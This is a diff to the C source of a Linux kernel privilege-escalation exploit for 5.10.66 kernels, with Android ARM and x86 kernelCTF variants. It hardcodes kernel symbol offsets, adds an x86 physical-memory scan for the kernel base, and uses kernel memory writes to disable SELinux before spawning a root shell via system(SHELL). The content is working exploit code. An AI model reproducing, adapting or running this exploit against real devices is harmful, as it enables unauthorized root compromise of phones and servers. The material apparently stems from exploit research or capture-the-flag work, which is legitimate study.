@@ -1,4 +1,3 @@
-__kexploit_src_metadata("{\"original_kernel_name\":\"ingots_5.10.66\",\"current_kernel_name\":\"ingots_5.10.66\"}")
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -16,7 +15,6 @@ __kexploit_src_metadata("{\"original_kernel_name\":\"ingots_5.10.66\",\"current_
 #include <sys/uio.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
-#include <root_payload.h>
 
 typedef uint64_t u64;
 typedef int64_t i64;
@@ -509,6 +507,8 @@ usize kaslr_base = 0;
 usize phys_base = 0;
 usize linear_base = 0;
 
+#ifdef ARM
+
 // for arm 5.10.66 android kernel from ingots
 
 #define LIBC_PATH "/apex/com.android.runtime/lib64/bionic/libc.so"
@@ -517,18 +517,18 @@ usize linear_base = 0;
 // this kernel does not have kmalloc-192, so object of interest goes in kmalloc-256
 #define SPRAY_SIZE 256
 
-#define KERNEL_BASE __kexploit_kernel_address("{\"address\":18446743799100080128,\"is_relative\":false}")
+#define KERNEL_BASE 0xffffffc010000000
 
 // on arm this symbol is called memstart_addr
-#define PAGE_OFFSET_BASE (__kexploit_kernel_address("{\"address\":18446743799138654616,\"is_relative\":false}") - KERNEL_BASE)
-#define PIPE_OPS_OFFSET (__kexploit_kernel_address("{\"address\":18446743799137015528,\"is_relative\":false}") - KERNEL_BASE)
-#define INIT_OFFSET (__kexploit_kernel_address("{\"address\":18446743799143906880,\"is_relative\":false}") - KERNEL_BASE)
+#define PAGE_OFFSET_BASE (0xffffffc0124c9998 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffc0123396e8 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffc0129cbe40 - KERNEL_BASE)
 
 // optinally define to turn off selinux
-#define SELINUX_STATE_OFFSET (__kexploit_kernel_address("{\"address\":18446743799146691352,\"is_relative\":false}") - KERNEL_BASE)
+#define SELINUX_STATE_OFFSET (0xffffffc012c73b18 - KERNEL_BASE)
 
 // first 64 bit word of kernel image
-#define KERNEL_START_WORD __kexploit_kernel_data("{\"address\":18446743799100080128,\"num_bytes\":8,\"original_value\":1484710131542284877}")
+#define KERNEL_START_WORD 0x149abfff91005a4d
 
 #define VMEMMAP_START 0xfffffffeffe00000
 #define LINEAR_BASE 0xffffff8000000000
@@ -545,6 +545,38 @@ usize is_linear_address(usize addr) {
 usize is_kernel_address(usize addr) {
   return (addr & 0xffffffc000000000) == 0xffffffc000000000;
 }
+
+#else
+
+// for x86 build of 5.10.66 kernel using lts kernel config from kernelctf
+
+#define LIBC_PATH "/lib/libc.so.0"
+#define SHELL "/bin/bash"
+
+#define SPRAY_SIZE 192
+
+#define KERNEL_BASE 0xffffffff81000000
+
+#define PAGE_OFFSET_BASE (0xffffffff82edd490 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
+
+// first 64 bit word of kernel image
+#define KERNEL_START_WORD 0x4802603f51258d48
+
+usize addr_to_page(usize addr) {
+  return ((addr >> 12) << 6) + vmem_base;
+}
+
+usize is_linear_address(usize addr) {
+  return (addr & 0xffff000000000000) == 0xffff000000000000;
+}
+
+usize is_kernel_address(usize addr) {
+  return (addr & 0xffffffff80000000) == 0xffffffff80000000;
+}
+
+#endif
 
 typedef struct {
   IoUring io_uring;
@@ -832,6 +864,8 @@ void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
   }
 }
 
+#ifdef ARM
+
 void scan_kernel_phys_base() {
   // scanning did not work for some reason
   phys_base = PHYS_BASE;
@@ -845,6 +879,22 @@ void scan_kernel_phys_base() {
   //   phys_base += 0x1000;
   // }
 }
+
+#else
+
+void scan_kernel_phys_base() {
+  usize start_bytes = KERNEL_START_WORD;
+  phys_base = 0;
+  for (;;) {
+    if (read64(phys_base) == start_bytes) {
+      break;
+    }
+
+    phys_base += 0x1000;
+  }
+}
+
+#endif
 
 void exploit() {
   int start_step_pipes[2] = { 0 };
@@ -1105,8 +1155,7 @@ void exploit() {
   write64_kernel(SELINUX_STATE_OFFSET + kaslr_base - 7, 0);
 #endif
 
-  // system(SHELL);
-  root_payload();
+  system(SHELL);
 
   while (1) {
     sleep(1000);
